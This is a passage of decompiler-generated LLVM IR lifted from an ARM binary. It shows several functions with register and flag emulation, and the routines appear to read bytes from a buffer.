  %v8_12300 = load i32, i32* %v7_12300, align 4
  store i32 %v8_12300, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %v3_12308.pre, i32* @ip, align 4
  store i32 74516, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v3_12308.pre)
  %v0_12314 = load i32, i32* %r4.global-to-local, align 4
  %v1_12314 = add i32 %v0_12314, 4
  %v2_12314 = inttoptr i32 %v1_12314 to i32*
  %v3_12314 = load i32, i32* %v2_12314, align 4
  store i32 %v3_12314, i32* %r3.global-to-local, align 4
  %v0_12318 = load i32, i32* %r0.global-to-local, align 4
  %v2_12318 = sub i32 %v0_12318, %v3_12314
  %v4_12318 = xor i32 %v0_12318, %v3_12314
  %v5_12318 = xor i32 %v2_12318, %v0_12318
  %v6_12318 = and i32 %v5_12318, %v4_12318
  %v7_12318 = icmp slt i32 %v6_12318, 0
  store i1 %v7_12318, i1* %cpsr_v.global-to-local, align 1
  %v8_12318 = icmp slt i32 %v2_12318, 0
  store i1 %v8_12318, i1* %cpsr_n.global-to-local, align 1
  %v9_12318 = icmp eq i32 %v0_12318, %v3_12314
  store i1 %v9_12318, i1* %cpsr_z.global-to-local, align 1
  %v0_1231c = load i32, i32* %r6.global-to-local, align 4
  %v2_1231c = add i32 %v0_1231c, %v0_12318
  store i32 %v2_1231c, i32* %r6.global-to-local, align 4
  %v1_12320 = add i32 %v0_12314, 12
  store i32 %v1_12320, i32* %r4.global-to-local, align 4
  br i1 %v9_12318, label %dec_label_pc_12328, label %dec_label_pc_122ec

dec_label_pc_12328:                               ; preds = %dec_label_pc_12300
  %v1_12328 = load i32, i32* %r5.global-to-local, align 4
  %v2_12328 = sub i32 %v1_12320, %v1_12328
  %v3_12328 = icmp ult i32 %v1_12320, %v1_12328
  %v4_12328 = xor i32 %v1_12328, %v1_12320
  %v5_12328 = xor i32 %v2_12328, %v1_12320
  %v6_12328 = and i32 %v5_12328, %v4_12328
  %v7_12328 = icmp slt i32 %v6_12328, 0
  store i1 %v7_12328, i1* %cpsr_v.global-to-local, align 1
  %v8_12328 = icmp slt i32 %v2_12328, 0
  store i1 %v8_12328, i1* %cpsr_n.global-to-local, align 1
  %v9_12328 = icmp eq i32 %v1_12320, %v1_12328
  store i1 %v9_12328, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_12328, label %dec_label_pc_12300, label %dec_label_pc_12330

dec_label_pc_12330:                               ; preds = %dec_label_pc_12328, %dec_label_pc_122ec
  %v0_12330 = phi i32 [ -1, %dec_label_pc_122ec ], [ %v2_1231c, %dec_label_pc_12328 ]
  store i32 %v0_12330, i32* %r0.global-to-local, align 4
  %v2_12338 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_12338, i32* %r4.global-to-local, align 4
  store i32 %v6_11b70, i32* @r5, align 4
  store i32 %v9_11b70, i32* @r6, align 4
  store i32 %v12_11b70, i32* @r7, align 4
  store i32 %v15_11b70, i32* @r8, align 4
  store i32 %v18_11b70, i32* @sb, align 4
  store i32 %v21_11b70, i32* @sl, align 4
  ret i32 %v0_12330

; uselistorder directives
  uselistorder i32 %v0_12330, { 1, 0 }
  uselistorder i32 %v2_12328, { 1, 0 }
  uselistorder i32 %v1_12328, { 2, 0, 1, 3 }
  uselistorder i32 %v1_12320, { 4, 0, 1, 5, 3, 6, 2 }
  uselistorder i32 %v2_12318, { 1, 0 }
  uselistorder i32 %v0_12318, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v3_12314, { 2, 0, 1, 3 }
  uselistorder i32 %v0_12300, { 2, 1, 0 }
  uselistorder i32 %v3_122c4, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_122a0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_12268, { 0, 1, 3, 2 }
  uselistorder i32 %v4_1225c, { 1, 2, 0 }
  uselistorder i32 %v0_1225c, { 1, 0 }
  uselistorder i32 %v1_12264.pre, { 6, 5, 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_1221c, { 2, 3, 4, 5, 1, 0 }
  uselistorder i32 %v0_12200, { 1, 0 }
  uselistorder i32 %storemerge179, { 1, 0 }
  uselistorder i32 %v0_121dc, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_121d0, { 3, 0, 1, 2 }
  uselistorder i32 %v2_121ac, { 1, 0 }
  uselistorder i32 %v2_121a4, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v0_1219c, { 1, 0 }
  uselistorder i32 %v0_12194, { 3, 0, 1, 2 }
  uselistorder i32 %v0_1217c, { 1, 0 }
  uselistorder i32 %v1_12158, { 1, 2, 0, 3 }
  uselistorder i32 %v0_12158, { 1, 0, 2 }
  uselistorder i32 %v0_12130, { 3, 0, 1, 2 }
  uselistorder i1 %v2_12110, { 2, 1, 0 }
  uselistorder i32 %v2_1209c, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v2_1208c, { 2, 1, 3, 5, 0, 4, 6 }
  uselistorder i32 %v1_121b4, { 2, 6, 0, 7, 5, 1, 3, 4, 8 }
  uselistorder i32 %v0_120f8, { 3, 0, 5, 4, 6, 7, 9, 1, 2, 8 }
  uselistorder i32 %v0_12038, { 1, 4, 0, 2, 3 }
  uselistorder i1 %v2_1201c, { 1, 0 }
  uselistorder i32 %v1_12014, { 1, 2, 0 }
  uselistorder i32 %v2_12008, { 1, 0 }
  uselistorder i32 %v1_12008, { 1, 2, 0, 3 }
  uselistorder i32 %v0_12008, { 3, 4, 0, 5, 6, 1, 2, 7 }
  uselistorder i32 %v1_12000, { 1, 0, 2 }
  uselistorder i32 %v0_11ff8, { 3, 0, 1, 2 }
  uselistorder i1 %v3_11fd8, { 1, 0 }
  uselistorder i32 %v2_11fd8, { 1, 0 }
  uselistorder i32 %v2_11fd4, { 3, 2, 1, 4, 5, 7, 0, 8, 6, 9 }
  uselistorder i1 %v7_11fc0, { 1, 0 }
  uselistorder i32 %v1_11fc4, { 2, 1, 0 }
  uselistorder i1 %v2_11fb4, { 1, 0 }
  uselistorder i32 %v0_11fb0, { 2, 4, 0, 1, 5, 3, 7, 6 }
  uselistorder i1 %v2_11f98, { 1, 0 }
  uselistorder i32 %stack_var_-192.7, { 1, 0, 2 }
  uselistorder i32 %v1_11f8c, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v1_11f44, { 1, 2, 0 }
  uselistorder i32 %v2_11f40, { 1, 0, 2, 3 }
  uselistorder i32 %v0_11f28, { 1, 3, 5, 6, 0, 4, 2 }
  uselistorder i1 %v2_11f20, { 1, 0 }
  uselistorder i32 %v0_11f2c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v5_11f08, { 1, 0 }
  uselistorder i32 %v0_11ef4, { 2, 3, 0, 6, 1, 4, 5 }
  uselistorder i32 %v0_11ee8, { 0, 2, 1, 3 }
  uselistorder i32 %v0_11edc, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v0_11ed8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_11eb4, { 1, 0 }
  uselistorder i32 %v0_11e68, { 1, 0 }
  uselistorder i32 %v0_11e54, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-192.6, { 1, 2, 0, 3 }
  uselistorder i32 %v2_11d7c, { 1, 0, 2 }
  uselistorder i32 %v0_11d70, { 2, 3, 1, 0, 4, 5, 6 }
  uselistorder i32 %v0_11d6c, { 1, 0, 2, 3 }
  uselistorder i32 %v3_11d68, { 2, 1, 0 }
  uselistorder i32 %v1_11d54, { 4, 3, 2, 0, 1 }
  uselistorder i32 %stack_var_-192.2, { 1, 2, 0, 3 }
  uselistorder i32 %v0_11d48, { 1, 0 }
  uselistorder i32 %v5_11d00, { 1, 0 }
  uselistorder i32 %v0_11cec, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_11c0c.v1_11c208, { 1, 0 }
  uselistorder i32 %v0_11cb4, { 1, 0 }
  uselistorder i32 %v4_11ca0, { 1, 2, 0 }
  uselistorder i32 %v0_11c44, { 1, 0, 2, 3 }
  uselistorder i32 %v1_11f24, { 1, 2, 3, 6, 4, 5, 0 }
  uselistorder i32 %v1_11b80, { 1, 0 }
  uselistorder i32* %stack_var_-79, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-78, { 1, 2, 0 }
  uselistorder i32* %stack_var_-176, { 1, 0 }
  uselistorder i32* %stack_var_-43, { 1, 0 }
  uselistorder i32* %stack_var_-160, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-42, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %tmp, { 3, 2, 1, 0, 4, 5, 6, 7 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 6, 4, 5, 7 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 3, 0, 4, 11, 12, 13, 5, 14, 15, 16, 6, 17, 18, 19, 7, 20, 21, 22, 8, 23, 24, 25, 9, 10, 26, 27 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 19, 17, 18, 20, 21, 22, 23, 24, 26, 25, 46, 28, 29, 33, 30, 31, 32, 34, 27, 35, 36, 37, 38, 39, 41, 40, 42, 43, 44, 45, 58, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 59, 60, 61, 62, 63, 64, 65, 66, 67, 1, 68, 69, 70, 71, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 15, 12, 16, 17, 13, 14, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 33, 31, 32, 34, 35, 36, 37, 38, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 9, 10, 11, 6, 7, 8, 12, 13, 14, 16, 15, 17, 18, 19, 1, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 44, 8, 19, 17, 16, 20, 9, 10, 18, 11, 12, 1, 15, 13, 14, 21, 22, 23, 40, 45, 24, 26, 25, 27, 43, 28, 29, 30, 31, 32, 33, 34, 35, 42, 36, 37, 41, 38, 39, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 8, 5, 6, 7, 9, 10, 13, 11, 12, 14, 15, 0, 16, 17, 18, 19, 20 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 61, 19, 20, 21, 22, 23, 24, 25, 26, 60, 27, 28, 29, 30, 31, 59, 32, 33, 34, 35, 36, 37, 38, 0, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58 }
  uselistorder i1* %cpsr_v.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 58, 18, 19, 20, 21, 22, 23, 24, 25, 26, 57, 27, 28, 29, 30, 56, 31, 32, 33, 34, 35, 36, 37, 0, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55 }
  uselistorder i1* %cpsr_n.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 60, 19, 20, 21, 22, 23, 24, 25, 26, 27, 59, 28, 29, 30, 31, 61, 32, 33, 34, 35, 36, 37, 38, 0, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58 }
  uselistorder i32 47, { 1, 0 }
  uselistorder i32 112, { 2, 4, 0, 5, 3, 1, 6 }
  uselistorder i32 176, { 1, 3, 2, 4, 0, 5 }
  uselistorder i8 56, { 1, 0 }
  uselistorder i32 102, { 3, 0, 1, 4, 5, 2, 6 }
  uselistorder i32 (i32, i32, i32, i32)* @function_15a9c, { 1, 0 }
  uselistorder i32 1104006501, { 1, 4, 0, 2, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_180e0.551 to i32), { 1, 0, 2 }
  uselistorder i32 96, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_15570, { 2, 1, 0 }
  uselistorder i8 45, { 1, 0, 3, 2, 4 }
  uselistorder i32 (i32)* @function_15aa4, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_15898, { 2, 1, 0 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_122f8, { 2, 0, 1 }
  uselistorder label %bb271, { 1, 0 }
  uselistorder label %dec_label_pc_12258, { 2, 0, 1 }
  uselistorder label %dec_label_pc_121d0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_121a4, { 1, 0 }
  uselistorder label %.thread49, { 1, 0 }
  uselistorder label %dec_label_pc_1217c, { 1, 0 }
  uselistorder label %dec_label_pc_12158, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1213c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12108, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12104, { 0, 2, 1 }
  uselistorder label %dec_label_pc_12060, { 1, 0 }
  uselistorder label %bb258, { 1, 0 }
  uselistorder label %dec_label_pc_12050, { 1, 0 }
  uselistorder label %dec_label_pc_12044, { 1, 0 }
  uselistorder label %bb252, { 1, 0 }
  uselistorder label %bb250, { 1, 0 }
  uselistorder label %bb248, { 1, 0 }
  uselistorder label %.thread161, { 1, 0 }
  uselistorder label %bb244, { 1, 0 }
  uselistorder label %bb242, { 1, 0 }
  uselistorder label %.preheader, { 3, 1, 0, 2 }
  uselistorder label %bb239, { 1, 0 }
  uselistorder label %dec_label_pc_11f64, { 2, 1, 0 }
  uselistorder label %bb236, { 2, 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_11e8c, { 1, 0 }
  uselistorder label %dec_label_pc_11e4c, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_11df0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11de8, { 1, 0 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %dec_label_pc_11cdc, { 1, 0 }
  uselistorder label %bb228, { 1, 0 }
  uselistorder label %dec_label_pc_11bf8, { 1, 0 }
  uselistorder label %bb222, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_1233c(i32 %arg1, i64* %arg2) local_unnamed_addr {
dec_label_pc_1233c:
  %v0_12350 = load i1, i1* @cpsr_n, align 1
  br i1 %v0_12350, label %bb, label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_1233c
  %v0_1235c.pr = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1235c.pr, label %thread-pre-split._crit_edge, label %.thread2

thread-pre-split._crit_edge:                      ; preds = %thread-pre-split
  br label %bb10

bb:                                               ; preds = %dec_label_pc_1233c
  %v1_12354 = load i32, i32* @r4, align 4
  %v3_12354 = xor i32 %v1_12354, %arg1
  %v2_12358 = sub i32 -1, %v3_12354
  %v4_12358 = icmp eq i32 %v3_12354, -1
  br i1 %v4_12358, label %bb10, label %.thread2

bb10:                                             ; preds = %thread-pre-split._crit_edge, %bb
  %v12_123608 = phi i32 [ %arg1, %thread-pre-split._crit_edge ], [ %v2_12358, %bb ]
  br label %.thread2

.thread2:                                         ; preds = %bb, %thread-pre-split, %bb10
  %v12_12360 = phi i32 [ %v2_12358, %bb ], [ %arg1, %thread-pre-split ], [ %v12_123608, %bb10 ]
  ret i32 %v12_12360

; uselistorder directives
  uselistorder i32 %v2_12358, { 1, 0 }
  uselistorder i32 %v3_12354, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @function_12364(i8* %arg1) local_unnamed_addr {
dec_label_pc_12364:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-9 = alloca i8, align 1
  %stack_var_-8 = alloca i32, align 4
  %v3_12364 = load i32, i32* @r4, align 4
  store i32 %v3_12364, i32* %stack_var_-8, align 4
  %v0_12368 = load i32, i32* @r0, align 4
  %v1_12368 = add i32 %v0_12368, 16
  %v2_12368 = inttoptr i32 %v1_12368 to i32*
  %v3_12368 = load i32, i32* %v2_12368, align 4
  store i32 %v3_12368, i32* %r2.global-to-local, align 4
  %v1_1236c = add i32 %v0_12368, 24
  %v2_1236c = inttoptr i32 %v1_1236c to i32*
  %v3_1236c = load i32, i32* %v2_1236c, align 4
  %v3_12370 = icmp ult i32 %v3_12368, %v3_1236c
  store i32 %v0_12368, i32* @r4, align 4
  br i1 %v3_12370, label %bb, label %dec_label_pc_12388

bb:                                               ; preds = %dec_label_pc_12364
  %v2_12378 = inttoptr i32 %v3_12368 to i8*
  %v3_12378 = load i8, i8* %v2_12378, align 1
  %v4_12378 = zext i8 %v3_12378 to i32
  store i32 %v4_12378, i32* %r0.global-to-local, align 4
  %v6_12378 = add i32 %v3_12368, 1
  store i32 %v6_12378, i32* %r2.global-to-local, align 4
  store i32 %v6_12378, i32* %v2_12368, align 4
  br label %dec_label_pc_12488

dec_label_pc_12388:                               ; preds = %dec_label_pc_12364
  %v1_12388 = inttoptr i32 %v0_12368 to i8*
  %v2_12388 = load i8, i8* %v1_12388, align 1
  %v3_12388 = zext i8 %v2_12388 to i32
  %v1_1238c = and i32 %v3_12388, 131
  %tmp22 = icmp ugt i32 %v1_1238c, 128
  br i1 %tmp22, label %dec_label_pc_123a8, label %dec_label_pc_12398

dec_label_pc_12398:                               ; preds = %dec_label_pc_12388
  store i32 128, i32* @r1, align 4
  %v0_1239c = call i32 @function_13bf0()
  store i32 %v0_1239c, i32* %r0.global-to-local, align 4
  %v2_123a0 = icmp eq i32 %v0_1239c, 0
  br i1 %v2_123a0, label %dec_label_pc_12398.dec_label_pc_123a8_crit_edge, label %dec_label_pc_12484

dec_label_pc_12398.dec_label_pc_123a8_crit_edge:  ; preds = %dec_label_pc_12398
  %v0_123a8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_123a8

dec_label_pc_123a8:                               ; preds = %dec_label_pc_12398.dec_label_pc_123a8_crit_edge, %dec_label_pc_12388
  %v2_123f4 = phi i32 [ %v0_123a8.pre, %dec_label_pc_12398.dec_label_pc_123a8_crit_edge ], [ %v0_12368, %dec_label_pc_12388 ]
  %v1_123a8 = inttoptr i32 %v2_123f4 to i8*
  %v2_123a8 = load i8, i8* %v1_123a8, align 1
  %v3_123a8 = zext i8 %v2_123a8 to i32
  store i32 %v3_123a8, i32* %r2.global-to-local, align 4
  %v1_123ac = add i32 %v2_123f4, 1
  %v2_123ac = inttoptr i32 %v1_123ac to i8*
  %v3_123ac = load i8, i8* %v2_123ac, align 1
  %v4_123ac = zext i8 %v3_123ac to i32
  %v4_123b0 = mul nuw nsw i32 %v4_123ac, 256
  %v5_123b0 = or i32 %v4_123b0, %v3_123a8
  store i32 %v5_123b0, i32* %r2.global-to-local, align 4
  %v1_123b4 = and i32 %v3_123a8, 2
  %v2_123b4 = icmp eq i32 %v1_123b4, 0
  br i1 %v2_123b4, label %dec_label_pc_123e4, label %dec_label_pc_123bc

dec_label_pc_123bc:                               ; preds = %dec_label_pc_123a8
  %tmp23 = urem i8 %v2_123a8, 2
  %v1_123bc = zext i8 %tmp23 to i32
  %tmp18 = sub nsw i32 0, %v1_123bc
  %v4_123c0 = and i32 %tmp18, 4
  %v5_123c0 = add i32 %v4_123c0, %v2_123f4
  %v1_123c4 = add i32 %v5_123c0, 36
  %v2_123c4 = inttoptr i32 %v1_123c4 to i8*
  %v3_123c4 = load i8, i8* %v2_123c4, align 1
  %v4_123c4 = zext i8 %v3_123c4 to i32
  %v1_123c8 = add nsw i32 %v5_123b0, -1
  store i32 %v1_123c8, i32* %r2.global-to-local, align 4
  %v3_123cc = sdiv i32 %v1_123c8, 256
  store i32 %v3_123cc, i32* %r1.global-to-local, align 4
  store i32 %v4_123c4, i32* %r0.global-to-local, align 4
  %v2_123d8 = add i32 %v2_123f4, 40
  %v3_123d8 = inttoptr i32 %v2_123d8 to i32*
  store i32 0, i32* %v3_123d8, align 4
  %v0_123dc = load i32, i32* %r1.global-to-local, align 4
  %v1_123dc = trunc i32 %v0_123dc to i8
  %v2_123dc = load i32, i32* @r4, align 4
  %v3_123dc = add i32 %v2_123dc, 1
  %v4_123dc = inttoptr i32 %v3_123dc to i8*
  store i8 %v1_123dc, i8* %v4_123dc, align 1
  br label %dec_label_pc_12418

dec_label_pc_123e4:                               ; preds = %dec_label_pc_123a8
  %v1_123e4 = add i32 %v2_123f4, 16
  store i32 %v1_123e4, i32* %r1.global-to-local, align 4
  %v1_123e8 = inttoptr i32 %v1_123e4 to i32*
  %v2_123e8 = load i32, i32* %v1_123e8, align 4
  store i32 %v2_123e8, i32* %r1.global-to-local, align 4
  %v3_123e8 = add i32 %v2_123f4, 20
  %v4_123e8 = inttoptr i32 %v3_123e8 to i32*
  %v5_123e8 = load i32, i32* %v4_123e8, align 4
  %v9_123ec = icmp eq i32 %v5_123e8, %v2_123e8
  br i1 %v9_123ec, label %dec_label_pc_123fc, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_123e4
  %v2_123f0 = inttoptr i32 %v2_123e8 to i8*
  %v3_123f0 = load i8, i8* %v2_123f0, align 1
  %v4_123f0 = zext i8 %v3_123f0 to i32
  store i32 %v4_123f0, i32* %r0.global-to-local, align 4
  %v6_123f0 = add i32 %v2_123e8, 1
  store i32 %v6_123f0, i32* %r1.global-to-local, align 4
  store i32 %v6_123f0, i32* %v1_123e8, align 4
  br label %dec_label_pc_12488

dec_label_pc_123fc:                               ; preds = %dec_label_pc_123e4
  %v1_123fc = add i32 %v2_123f4, 4
  %v2_123fc = inttoptr i32 %v1_123fc to i32*
  %v3_123fc = load i32, i32* %v2_123fc, align 4
  %v4_12404 = icmp eq i32 %v3_123fc, -2
  br i1 %v4_12404, label %dec_label_pc_12408, label %dec_label_pc_12420

dec_label_pc_12408:                               ; preds = %dec_label_pc_123fc
  %v1_12408 = or i32 %v5_123b0, 4
  store i32 %v1_12408, i32* %r2.global-to-local, align 4
  store i8 %v3_123ac, i8* %v2_123ac, align 1
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12418

dec_label_pc_12418:                               ; preds = %dec_label_pc_123bc, %dec_label_pc_12408
  %v0_12418 = load i32, i32* %r2.global-to-local, align 4
  %v1_12418 = trunc i32 %v0_12418 to i8
  %v2_12418 = load i32, i32* @r4, align 4
  %v3_12418 = inttoptr i32 %v2_12418 to i8*
  store i8 %v1_12418, i8* %v3_12418, align 1
  br label %dec_label_pc_12488

dec_label_pc_12420:                               ; preds = %dec_label_pc_123fc
  %v1_12420 = and i32 %v4_123b0, 768
  %v2_12420 = icmp eq i32 %v1_12420, 0
  br i1 %v2_12420, label %bb20, label %bb19

bb19:                                             ; preds = %dec_label_pc_12420
  store i32 ptrtoint (i32** @global_var_202d4.329 to i32), i32* %r0.global-to-local, align 4
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_12420, %bb19
  store i32 74796, i32* @lr, align 4
  %v1_12428 = xor i1 %v2_12420, true
  call void @__pseudo_cond_branch(i1 %v1_12428, i32 ptrtoint (i32* @global_var_eae8.560 to i32))
  %v0_1242c = load i32, i32* @r4, align 4
  %v1_1242c = add i32 %v0_1242c, 8
  store i32 %v1_1242c, i32* %r2.global-to-local, align 4
  %v1_12430 = inttoptr i32 %v1_1242c to i32*
  %v2_12430 = load i32, i32* %v1_12430, align 4
  store i32 %v2_12430, i32* %r2.global-to-local, align 4
  %v3_12430 = add i32 %v0_1242c, 12
  %v4_12430 = inttoptr i32 %v3_12430 to i32*
  %v5_12430 = load i32, i32* %v4_12430, align 4
  %v9_12434 = icmp eq i32 %v5_12430, %v2_12430
  br i1 %v9_12434, label %dec_label_pc_12468, label %dec_label_pc_1243c

dec_label_pc_1243c:                               ; preds = %bb20
  %v2_1243c = add i32 %v0_1242c, 24
  %v3_1243c = inttoptr i32 %v2_1243c to i32*
  store i32 %v2_12430, i32* %v3_1243c, align 4
  %v0_12440 = load i32, i32* @r4, align 4
  store i32 %v0_12440, i32* %r0.global-to-local, align 4
  %v2_12444 = call i32 @function_13bc4(i32 %v0_12440)
  store i32 %v2_12444, i32* %r0.global-to-local, align 4
  %v2_12448 = icmp eq i32 %v2_12444, 0
  br i1 %v2_12448, label %dec_label_pc_12484, label %dec_label_pc_12450

dec_label_pc_12450:                               ; preds = %dec_label_pc_1243c
  %v0_12450 = load i32, i32* @r4, align 4
  %v1_12450 = add i32 %v0_12450, 20
  %v2_12450 = inttoptr i32 %v1_12450 to i32*
  %v3_12450 = load i32, i32* %v2_12450, align 4
  %v2_12454 = add i32 %v0_12450, 24
  %v3_12454 = inttoptr i32 %v2_12454 to i32*
  store i32 %v3_12450, i32* %v3_12454, align 4
  %v0_12458 = load i32, i32* @r4, align 4
  %v1_12458 = add i32 %v0_12458, 16
  %v2_12458 = inttoptr i32 %v1_12458 to i32*
  %v3_12458 = load i32, i32* %v2_12458, align 4
  %v1_1245c = inttoptr i32 %v3_12458 to i8*
  %v2_1245c = load i8, i8* %v1_1245c, align 1
  %v3_1245c = zext i8 %v2_1245c to i32
  store i32 %v3_1245c, i32* %r0.global-to-local, align 4
  %v5_1245c = add i32 %v3_12458, 1
  store i32 %v5_1245c, i32* %v2_12458, align 4
  br label %dec_label_pc_12488

dec_label_pc_12468:                               ; preds = %bb20
  %v1_12468 = inttoptr i32 %v0_1242c to i8*
  store i32 %v0_1242c, i32* %r0.global-to-local, align 4
  %v2_1246c = ptrtoint i8* %stack_var_-9 to i32
  store i32 %v2_1246c, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_12474 = call i32 @function_13a9c(i8* %v1_12468, i32 %v2_1246c, i32 1)
  store i32 %v5_12474, i32* %r0.global-to-local, align 4
  %v2_12478 = icmp eq i32 %v5_12474, 0
  br i1 %v2_12478, label %dec_label_pc_12484, label %bb21

bb21:                                             ; preds = %dec_label_pc_12468
  %v4_1247c = load i8, i8* %stack_var_-9, align 1
  %v5_1247c = sext i8 %v4_1247c to i32
  store i32 %v5_1247c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12488

dec_label_pc_12484:                               ; preds = %dec_label_pc_12468, %dec_label_pc_12398, %dec_label_pc_1243c
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12488

dec_label_pc_12488:                               ; preds = %bb, %bb21, %.thread4, %dec_label_pc_12450, %dec_label_pc_12418, %dec_label_pc_12484
  %v2_1248c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1248c, i32* @r4, align 4
  %v8_1248c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v8_1248c

; uselistorder directives
  uselistorder i32 %v2_123e8, { 1, 0, 2, 3 }
  uselistorder i32 %v3_123a8, { 1, 0, 2 }
  uselistorder i32 %v2_123f4, { 1, 3, 2, 4, 0, 6, 5 }
  uselistorder i32 %v3_12368, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-9, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 12, 3, 4, 1, 5, 6, 0, 7, 8, 9, 10, 11, 2, 13 }
  uselistorder i8** @global_var_2030c.277, { 2, 1, 0 }
  uselistorder i32** @global_var_202d4.329, { 0, 2, 1 }
  uselistorder label %dec_label_pc_12488, { 5, 1, 3, 4, 2, 0 }
  uselistorder label %dec_label_pc_12484, { 0, 2, 1 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_12418, { 1, 0 }
}

define i32 @function_124a0(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_124a0:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_124a0 = load i32, i32* @r1, align 4
  %v1_124a0 = load i32, i32* %r0.global-to-local, align 4
  %v2_124a0 = sub i32 %v0_124a0, %v1_124a0
  %v3_124a0 = icmp ult i32 %v0_124a0, %v1_124a0
  %v4_124a0 = xor i32 %v1_124a0, %v0_124a0
  %v5_124a0 = xor i32 %v2_124a0, %v0_124a0
  %v6_124a0 = and i32 %v5_124a0, %v4_124a0
  %v7_124a0 = icmp slt i32 %v6_124a0, 0
  store i1 %v7_124a0, i1* %cpsr_v.global-to-local, align 1
